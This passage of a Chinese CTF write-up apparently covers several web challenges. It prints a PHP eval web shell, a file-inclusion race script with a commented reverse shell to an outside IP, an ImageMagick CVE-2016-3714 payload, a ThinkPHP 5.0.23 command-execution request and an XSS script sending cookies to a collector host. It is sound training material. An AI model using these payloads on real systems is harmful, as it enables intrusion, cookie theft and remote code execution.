+<div class="language-php"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-php" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>&lt;?php @eval($_POST[&#x27;flag&#x27;]) ?&gt;</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">上传文件，页面下断点，把类型判断改掉</p>
+<p class="my-4 leading-7"><img alt="chrome devtool出场" src="/static/image/web-11-1.d9c1f1a1.png"/></p>
+<div class="language-javascript"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-javascript" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>allow_ext</span><span class="token operator">=</span><span class="token" style="color:var(--code-token-string)">&quot;.php&quot;</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">蚁剑连接完毕。</p>
+<h2 id="web-12-只有本人才能查看哦" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-12-只有本人才能查看哦">#</a>web-12 只有本人才能查看哦</h2>
+<p class="my-4 leading-7">我也很了解HTTP</p>
+<div class="language-shell"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-shell" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span class="token" style="color:var(--code-token-function)">curl</span><span> --location --request GET </span><span class="token" style="color:var(--code-token-string)">&#x27;http://10.38.204.122/&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Accept-Language: zh-CN,zh;q=0.9,en;q=0.8&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Cache-Control: max-age=0&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Connection: keep-alive&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Upgrade-Insecure-Requests: 1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;X-Forwarded-For:  localhost&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Referer:  http://localhost/&#x27;</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<h2 id="web-13-写个phpinfo能有多大风险" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-13-写个phpinfo能有多大风险">#</a>web-13 写个phpinfo能有多大风险</h2>
+<p class="my-4 leading-7">这个题目卡了好久，通过url判断考查的是php文件包含，构造filter抓取了index.php的文件，发现特别直白。</p>
+<p class="my-4 leading-7"><a target="_blank" rel="noopener noreferrer" href="https://include-ctfd.dun.mi.com/index.php?page=php://filter/read=convert.base64-encode/resource=index.php" class="link-_707cf  link_3b154 inline-link_3b154">https://include-ctfd.dun.mi.com/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</a></p>
+<div class="language-php"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-php" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>&lt;?php
+</span></span><span style="display:block;padding:0 1.25rem">if ($_GET[page]) {
+</span><span style="display:block;padding:0 1.25rem">    include $_GET[page];
+</span><span style="display:block;padding:0 1.25rem">} else {
+</span><span style="display:block;padding:0 1.25rem">    include &quot;index.html&quot;;
+</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">但是 <code>php://input</code> 协议没有，果然没有这么简单。</p>
+<p class="my-4 leading-7">说是有个phpinfo，找了一圈在info.php找到了。</p>
+<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>allow_url_fopen=On
+</span></span><span style="display:block;padding:0 1.25rem">allow_url_include=Off</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">可以看到allow_url_include是off，怪不得php://input无效。</p>
+<p class="my-4 leading-7">百度找到一个smb加载远程文件的方法，但是只针对Windows环境，从phpinfo中看出这明显是一个linux环境。</p>
+<p class="my-4 leading-7">继续百度，找一个session上传进程漏洞利用。当session.upload_progress.enabled开启的时候会将上传文件的进度序列化保存到本地文件中，
+这个文件的路径和文件名可以通过猜测获得。于是通过包含这个进度文件，能够实现执行自定义命令的效果。</p>
+<p class="my-4 leading-7">但是这个过程极快，需要一个脚本不停的尝试。</p>
+<div class="language-python"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-python" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>import requests
+</span></span><span style="display:block;padding:0 1.25rem">import time
+</span><span style="display:block;padding:0 1.25rem">import threading
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">host = &#x27;https://include-ctfd.dun.mi.com/&#x27;
+</span><span style="display:block;padding:0 1.25rem">PHPSESSID = &#x27;vrhtvjd4j1sd88onr92fm9t2gt&#x27;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">headers = {
+</span><span style="display:block;padding:0 1.25rem">    &#x27;Cookie&#x27;: &#x27;TODO miduncookie; PHPSESSID=&#x27; + PHPSESSID}
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem"># data = {&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php system(&#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.167.90.69/3000 0&gt;&amp;1&#x27;);?&gt;&quot;}
+</span><span style="display:block;padding:0 1.25rem">data = {&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php echo `ls -al /home/mywww/flag_is_here`;?&gt;&quot;}
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem"># data = {&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php echo `cat /home/mywww/flag_is_here`;?&gt;&quot;}
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">def creatSession():
+</span><span style="display:block;padding:0 1.25rem">    while True:
+</span><span style="display:block;padding:0 1.25rem">        files = {
+</span><span style="display:block;padding:0 1.25rem">            &quot;upload&quot;: (&quot;tmp.jpg&quot;, open(&quot;/etc/passwd&quot;, &quot;rb&quot;))
+</span><span style="display:block;padding:0 1.25rem">        }
+</span><span style="display:block;padding:0 1.25rem">        # data = {&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php echo md5(&#x27;1&#x27;);?&gt;&quot;}
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">        r = requests.post(host + &quot;/info.php&quot;, files=files, headers=headers, data=data)
+</span><span style="display:block;padding:0 1.25rem">        # print(r.text)
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">fileName = &quot;/var/lib/php/sessions/sess_&quot; + PHPSESSID
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">if __name__ == &#x27;__main__&#x27;:
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    url = &quot;{}index.php?page={}&quot;.format(host, fileName)
+</span><span style="display:block;padding:0 1.25rem">    t = threading.Thread(target=creatSession, args=())
+</span><span style="display:block;padding:0 1.25rem">    t.setDaemon(True)
+</span><span style="display:block;padding:0 1.25rem">    t.start()
+</span><span style="display:block;padding:0 1.25rem">    while True:
+</span><span style="display:block;padding:0 1.25rem">        res = requests.get(url, headers=headers)
+</span><span style="display:block;padding:0 1.25rem">        print(&quot;[/] &quot; + res.text)
+</span><span style="display:block;padding:0 1.25rem">        if &quot;c4ca4238a0b923820dcc509a6f75849b&quot; in res.text:
+</span><span style="display:block;padding:0 1.25rem">            print(&quot;[*] Get shell success.&quot;)
+</span><span style="display:block;padding:0 1.25rem">            break
+</span><span style="display:block;padding:0 1.25rem">        else:
+</span><span style="display:block;padding:0 1.25rem">            print(&quot;[-] retry.&quot;)</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">开启两个线程，一个线程上传文件，另一个线程访问index.php获取包含的结果。</p>
+<p class="my-4 leading-7">经过不断的尝试和猜测路径，最终在/home/mywww/flag_is_here发现flag。</p>
+<h2 id="web-15-魔法的力量" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-15-魔法的力量">#</a>web-15 魔法的力量</h2>
+<p class="my-4 leading-7">该题利用了ImageMagick的CVE-2016-3714漏洞。</p>
+<p class="my-4 leading-7">ImageMagick流行的原因之一，就是它功能强大，可以处理很多情况，而有一个功能delegate，作用是调用外部的lib来处理文件。调用外部lib就是执行system命令，从而产生命令执行漏洞。</p>
+<p class="my-4 leading-7">解析https图片的时候，使用了curl命令将其下载，payload只需使用反引号或闭合双引号，就可以执行任意命令。</p>
+<p class="my-4 leading-7">将一下内容保存为xxx.png，上传既可触发列目录。</p>
+<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>push graphic-context
+</span></span><span style="display:block;padding:0 1.25rem">viewbox 0 0 640 480
+</span><span style="display:block;padding:0 1.25rem">fill &#x27;url(https://127.0.0.1/1.jpg&quot;|ls -al&quot;)&#x27;
+</span><span style="display:block;padding:0 1.25rem">pop graphic-context</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">从文件名中可以找到flag。</p>
+<h2 id="web-16-你听说过thinkphp吗" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-16-你听说过thinkphp吗">#</a>web-16 你听说过Thinkphp吗</h2>
+<p class="my-4 leading-7">听说过</p>
+<p class="my-4 leading-7">网页看出thinkphp版本是thinkphp 5.0.23</p>
+<p class="my-4 leading-7">推荐一个网站查看thinkphp的漏洞 <a target="_blank" rel="noopener noreferrer" href="https://www.exploit-db.com/" class="link-_707cf  link_3b154 inline-link_3b154">https://www.exploit-db.com/</a> ，在网站里搜索thinkphp，找到</p>
+<p class="my-4 leading-7"><a target="_blank" rel="noopener noreferrer" href="https://www.exploit-db.com/exploits/46150" class="link-_707cf  link_3b154 inline-link_3b154">https://www.exploit-db.com/exploits/46150</a></p>
+<p class="my-4 leading-7">这里没有开启debug模式，我们选择thinkphp 5.0.23(完整版)提到的内容</p>
+<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>33、（post）public/index.php?s=captcha (data) _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">构造请求执行命令</p>
+<div class="language-php"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-php" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>curl --location --request POST &#x27;https://thinkphp5-ctfd.dun.mi.com/index.php?s=captcha&#x27; \
+</span></span><span style="display:block;padding:0 1.25rem">--header &#x27;authority: thinkphp5-ctfd.dun.mi.com&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;accept-language: zh-CN,zh;q=0.9,en;q=0.8&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;cache-control: max-age=0&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;cookie: TODO cookie&#x27;\
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;sec-ch-ua: &quot;Chromium&quot;;v=&quot;104&quot;, &quot;/Not)A;Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;104&quot;&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;sec-ch-ua-mobile: ?0&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;sec-ch-ua-platform: &quot;macOS&quot;&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;sec-fetch-dest: document&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;sec-fetch-mode: navigate&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;sec-fetch-site: none&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;sec-fetch-user: ?1&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;upgrade-insecure-requests: 1&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--header &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--data-urlencode &#x27;_method=__construct&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--data-urlencode &#x27;filter[]=system&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--data-urlencode &#x27;method=get&#x27; \
+</span><span style="display:block;padding:0 1.25rem">--data-urlencode &#x27;server[REQUEST_METHOD]=cat AAA.php&#x27;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">感谢无名氏提前放置的一句话，这里借花献佛，直接无耻的用蚁剑连接了。</p>
+<p class="my-4 leading-7">翻找目录找到flag。</p>
+<h2 id="web-17-简陋的留言板" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-17-简陋的留言板">#</a>web-17 简陋的留言板</h2>
+<p class="my-4 leading-7">xss</p>
+<p class="my-4 leading-7">基本上没有过滤任何内容，这里使用一个重定向将cookie补充在路径中转发过去。需要一个服务查看访问的路径。</p>
+<div class="language-javascript"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-javascript" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span class="token operator">&lt;</span><span>script</span><span class="token operator">&gt;</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span></span><span class="token" style="color:var(--code-token-function)">setTimeout</span><span class="token" style="color:var(--code-token-punctuation)">(</span><span class="token" style="color:var(--code-token-punctuation)">(</span><span class="token" style="color:var(--code-token-punctuation)">)</span><span class="token operator">=&gt;</span><span class="token" style="color:var(--code-token-punctuation)">{</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>document</span><span class="token" style="color:var(--code-token-punctuation)">.</span><span>location</span><span class="token operator">=</span><span class="token" style="color:var(--code-token-string)">&quot;http://10.167.90.69:1337/xss/&quot;</span><span class="token operator">+</span><span class="token" style="color:var(--code-token-function)">encodeURIComponent</span><span class="token" style="color:var(--code-token-punctuation)">(</span><span>document</span><span class="token" style="color:var(--code-token-punctuation)">.</span><span>cookie</span><span class="token" style="color:var(--code-token-punctuation)">)</span><span class="token" style="color:var(--code-token-punctuation)">.</span><span class="token" style="color:var(--code-token-function)">substring</span><span class="token" style="color:var(--code-token-punctuation)">(</span><span class="token number">0</span><span class="token" style="color:var(--code-token-punctuation)">,</span><span> </span><span class="token number">255</span><span class="token" style="color:var(--code-token-punctuation)">)</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span></span><span class="token" style="color:var(--code-token-punctuation)">}</span><span class="token" style="color:var(--code-token-punctuation)">,</span><span> </span><span class="token number">1000</span><span class="token" style="color:var(--code-token-punctuation)">)</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span></span><span class="token operator">&lt;</span><span class="token operator">/</span><span>script</span><span class="token operator">&gt;</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 